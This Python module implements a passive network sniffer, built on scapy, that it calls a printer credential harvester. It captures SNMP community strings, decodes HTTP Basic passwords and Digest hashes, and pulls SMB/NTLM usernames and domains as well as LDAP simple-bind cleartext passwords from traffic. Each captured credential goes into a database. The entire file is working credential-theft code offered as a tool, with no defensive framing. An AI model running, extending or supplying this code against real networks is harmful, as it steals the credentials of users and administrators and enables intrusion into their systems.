"""
Printer Credential Harvester
─────────────────────────────
Passively harvests credentials from printer-related network protocols.

Features:
  - Capture SNMP community strings from GET/SET operations
  - Intercept HTTP Basic auth for printer web interfaces
  - Capture SMB credentials from print share access
  - Detect LDAP authentication attempts
  - Store all credentials in database
"""

import time
import struct
import threading
import base64

from scapy.all import sniff, IP, TCP, UDP, Raw

from .config import IS_WINDOWS, IS_LINUX, log


# Ports to monitor for credential harvesting
SNMP_PORTS = [161, 162]
HTTP_PORTS = [80, 443, 631, 8080, 9100]
SMB_PORTS = [139, 445]
LDAP_PORTS = [389, 636]

# Combined BPF filter for all printer credential ports
BPF_FILTER = (
    "udp port 161 or udp port 162 or "
    "tcp port 80 or tcp port 443 or tcp port 631 or tcp port 8080 or "
    "tcp port 139 or tcp port 445 or "
    "tcp port 389 or tcp port 636"
)


class PrinterCredentialHarvester:
    """
    Passive credential harvester for printer-related protocols.
    Sniffs network traffic for authentication data.
    """

    def __init__(self, interface, db=None):
        self.interface = interface
        self.db = db
        self.running = False
        self._thread = None
        self._credentials = []
        self._seen_creds = set()  # Deduplicate
        self._lock = threading.Lock()

    def start(self):
        """Start passive credential harvesting."""
        self.running = True
        self._thread = threading.Thread(target=self._harvest_loop, daemon=True)
        self._thread.start()
        log.info("PrinterCredentialHarvester: Started passive credential capture")

    def stop(self):
        """Stop credential harvesting."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(
            f"PrinterCredentialHarvester: Stopped. "
            f"Captured {len(self._credentials)} credentials"
        )

    def _harvest_loop(self):
        """Main sniffing loop for credential capture."""
        try:
            sniff(
                iface=self.interface,
                filter=BPF_FILTER,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: not self.running,
            )
        except Exception as e:
            log.error(f"PrinterCredentialHarvester: Sniff error: {e}")

    def _process_packet(self, pkt):
        """Route packet to appropriate credential checker."""
        if not pkt.haslayer(IP):
            return

        try:
            if pkt.haslayer(UDP):
                dport = pkt[UDP].dport
                sport = pkt[UDP].sport
                if dport in SNMP_PORTS or sport in SNMP_PORTS:
                    self._check_snmp(pkt)
                return

            if pkt.haslayer(TCP):
                dport = pkt[TCP].dport
                sport = pkt[TCP].sport

                if dport in HTTP_PORTS or sport in HTTP_PORTS:
                    self._check_http_auth(pkt)
                elif dport in SMB_PORTS or sport in SMB_PORTS:
                    self._check_smb(pkt)
                elif dport in LDAP_PORTS or sport in LDAP_PORTS:
                    self._check_ldap(pkt)

        except Exception as e:
            log.debug(f"PrinterCredentialHarvester: Packet processing error: {e}")

    def _check_snmp(self, pkt):
        """Extract SNMP community strings from GET/SET requests."""
        if not pkt.haslayer(Raw):
            return

        try:
            payload = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # SNMP packets start with ASN.1 SEQUENCE (0x30)
            if len(payload) < 10 or payload[0] != 0x30:
                return

            # Parse SNMP version (should be at offset ~4)
            idx = 2  # Skip sequence tag + length
            if payload[idx] == 0x81:
                idx += 1  # Extended length
            elif payload[idx] == 0x82:
                idx += 2

            # Version field: INTEGER (0x02)
            if idx >= len(payload) or payload[idx] != 0x02:
                return
            idx += 1
            ver_len = payload[idx]
            idx += 1 + ver_len

            # Community string: OCTET STRING (0x04)
            if idx >= len(payload) or payload[idx] != 0x04:
                return
            idx += 1
            comm_len = payload[idx]
            idx += 1

            if idx + comm_len > len(payload):
                return

            community = payload[idx:idx + comm_len].decode("utf-8", errors="ignore")

            # Skip common/default "public" reads unless targeting printers
            if community and community != "public":
                self._store_credential(
                    printer_ip=dst_ip,
                    username="",
                    password=community,
                    auth_method="SNMP",
                    found_via=f"SNMP community string from {src_ip}",
                )
            elif community == "public":
                # Still log public community if going to a printer port
                dport = pkt[UDP].dport
                if dport == 161:
                    self._store_credential(
                        printer_ip=dst_ip,
                        username="",
                        password=community,
                        auth_method="SNMPv1",
                        found_via=f"SNMP public community from {src_ip}",
                    )

        except Exception as e:
            log.debug(f"PrinterCredentialHarvester: SNMP parse error: {e}")

    def _check_http_auth(self, pkt):
        """Extract HTTP Basic/Digest auth credentials."""
        if not pkt.haslayer(Raw):
            return

        try:
            payload = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # Look for HTTP request with Authorization header
            if not (payload[:4] in (b"GET ", b"POST", b"PUT ", b"HEAD")):
                return

            text = payload.decode("utf-8", errors="ignore")
            lines = text.split("\r\n")

            for line in lines:
                lower_line = line.lower()

                # HTTP Basic Authentication
                if lower_line.startswith("authorization: basic "):
                    encoded = line[21:].strip()
                    try:
                        decoded = base64.b64decode(encoded).decode("utf-8", errors="ignore")
                        if ":" in decoded:
                            username, password = decoded.split(":", 1)
                            self._store_credential(
                                printer_ip=dst_ip,
                                username=username,
                                password=password,
                                auth_method="HTTP Basic",
                                found_via=f"HTTP request from {src_ip}",
                            )
                    except Exception:
                        pass

                # HTTP Digest Authentication (extract username/realm)
                elif lower_line.startswith("authorization: digest "):
                    auth_data = line[22:].strip()
                    username = self._extract_digest_field(auth_data, "username")
                    realm = self._extract_digest_field(auth_data, "realm")
                    response_hash = self._extract_digest_field(auth_data, "response")
                    if username:
                        self._store_credential(
                            printer_ip=dst_ip,
                            username=username,
                            password=f"digest:{response_hash}",
                            auth_method="HTTP Digest",
                            found_via=f"HTTP Digest from {src_ip} (realm={realm})",
                        )

        except Exception as e:
            log.debug(f"PrinterCredentialHarvester: HTTP parse error: {e}")

    def _extract_digest_field(self, data, field_name):
        """Extract a field value from HTTP Digest auth header."""
        marker = f'{field_name}="'
        idx = data.find(marker)
        if idx < 0:
            return None
        start = idx + len(marker)
        end = data.find('"', start)
        if end < 0:
            return None
        return data[start:end]

    def _check_smb(self, pkt):
        """Extract credentials from SMB authentication packets."""
        if not pkt.haslayer(Raw):
            return

        try:
            payload = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # SMB2 header magic: 0xFE 'S' 'M' 'B'
            # SMB1 header magic: 0xFF 'S' 'M' 'B'
            smb_offset = -1
            if b"\xffSMB" in payload:
                smb_offset = payload.find(b"\xffSMB")
            elif b"\xfeSMB" in payload:
                smb_offset = payload.find(b"\xfeSMB")

            if smb_offset < 0:
                return

            # Look for NTLMSSP authentication token
            ntlmssp_offset = payload.find(b"NTLMSSP\x00")
            if ntlmssp_offset < 0:
                return

            # NTLMSSP message type at offset +8
            msg_type_offset = ntlmssp_offset + 8
            if msg_type_offset + 4 > len(payload):
                return

            msg_type = struct.unpack("<I", payload[msg_type_offset:msg_type_offset + 4])[0]

            # Type 3 = Authentication message (contains credentials)
            if msg_type == 3:
                username = self._extract_ntlmssp_field(payload, ntlmssp_offset, 36)
                domain = self._extract_ntlmssp_field(payload, ntlmssp_offset, 28)

                if username:
                    display_user = f"{domain}\\{username}" if domain else username
                    self._store_credential(
                        printer_ip=dst_ip,
                        username=display_user,
                        password="[NTLM hash captured]",
                        auth_method="SMB/NTLM",
                        found_via=f"SMB auth from {src_ip}",
                    )

        except Exception as e:
            log.debug(f"PrinterCredentialHarvester: SMB parse error: {e}")

    def _extract_ntlmssp_field(self, payload, ntlmssp_base, field_offset):
        """Extract a unicode string field from NTLMSSP message."""
        try:
            abs_offset = ntlmssp_base + field_offset
            if abs_offset + 4 > len(payload):
                return None

            length = struct.unpack("<H", payload[abs_offset:abs_offset + 2])[0]
            offset = struct.unpack("<I", payload[abs_offset + 4:abs_offset + 8])[0]

            if length == 0 or length > 256:
                return None

            data_start = ntlmssp_base + offset
            if data_start + length > len(payload):
                return None

            field_data = payload[data_start:data_start + length]
            return field_data.decode("utf-16-le", errors="ignore").rstrip("\x00")

        except Exception:
            return None

    def _check_ldap(self, pkt):
        """Detect LDAP simple bind authentication attempts."""
        if not pkt.haslayer(Raw):
            return

        try:
            payload = bytes(pkt[Raw].load)
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # LDAP messages start with ASN.1 SEQUENCE (0x30)
            if len(payload) < 10 or payload[0] != 0x30:
                return

            # Look for BindRequest (APPLICATION 0 = 0x60)
            bind_idx = payload.find(b"\x60")
            if bind_idx < 0:
                return

            # Simple bind has auth choice 0x80 (context-specific [0])
            # The DN (username) and password follow as OCTET STRINGs
            remaining = payload[bind_idx:]

            # Find OCTET STRING fields for DN and password
            strings = []
            idx = 2  # Skip tag + length
            if idx < len(remaining) and remaining[idx] == 0x81:
                idx += 1
            elif idx < len(remaining) and remaining[idx] == 0x82:
                idx += 2

            # Skip version INTEGER
            if idx < len(remaining) and remaining[idx] == 0x02:
                idx += 1
                int_len = remaining[idx]
                idx += 1 + int_len

            # Extract DN (OCTET STRING 0x04)
            if idx < len(remaining) and remaining[idx] == 0x04:
                idx += 1
                str_len = remaining[idx]
                idx += 1
                if str_len < 200 and idx + str_len <= len(remaining):
                    dn = remaining[idx:idx + str_len].decode("utf-8", errors="ignore")
                    idx += str_len
                    strings.append(dn)

            # Extract password (context [0] = 0x80 for simple auth)
            if idx < len(remaining) and remaining[idx] == 0x80:
                idx += 1
                str_len = remaining[idx]
                idx += 1
                if str_len < 200 and idx + str_len <= len(remaining):
                    password = remaining[idx:idx + str_len].decode("utf-8", errors="ignore")
                    strings.append(password)

            if len(strings) == 2 and strings[0]:
                self._store_credential(
                    printer_ip=dst_ip,
                    username=strings[0],
                    password=strings[1],
                    auth_method="LDAP Simple Bind",
                    found_via=f"LDAP bind from {src_ip}",
                )

        except Exception as e:
            log.debug(f"PrinterCredentialHarvester: LDAP parse error: {e}")

    def _store_credential(self, printer_ip, username, password, auth_method, found_via):
        """Store a captured credential, deduplicating entries."""
        cred_key = (printer_ip, username, password, auth_method)

        with self._lock:
            if cred_key in self._seen_creds:
                return
            self._seen_creds.add(cred_key)

            cred = {
                "printer_ip": printer_ip,
                "username": username,
                "password": password,
                "auth_method": auth_method,
                "found_via": found_via,
                "timestamp": time.time(),
            }
            self._credentials.append(cred)

        log.warning(
            f"PrinterCredentialHarvester: Captured {auth_method} cred - "
            f"{username}@{printer_ip} via {found_via}"
        )

        # Store in database
        if self.db:
            try:
                self.db.log_printer_credential(
                    printer_ip=printer_ip,
                    username=username,
                    password=password,
                    auth_method=auth_method,
                    found_via=found_via,
                )
            except Exception as e:
                log.error(f"PrinterCredentialHarvester: DB error: {e}")

    def get_credentials(self):
        """Return all captured credentials."""
        with self._lock:
            return list(self._credentials)

    def get_stats(self):
        """Return harvester statistics."""
        with self._lock:
            methods = {}
            for cred in self._credentials:
                m = cred.get("auth_method", "Unknown")
                methods[m] = methods.get(m, 0) + 1

            return {
                "credentials_captured": len(self._credentials),
                "auth_methods": methods,
                "unique_targets": len(set(c["printer_ip"] for c in self._credentials)),
                "running": self.running,
            }
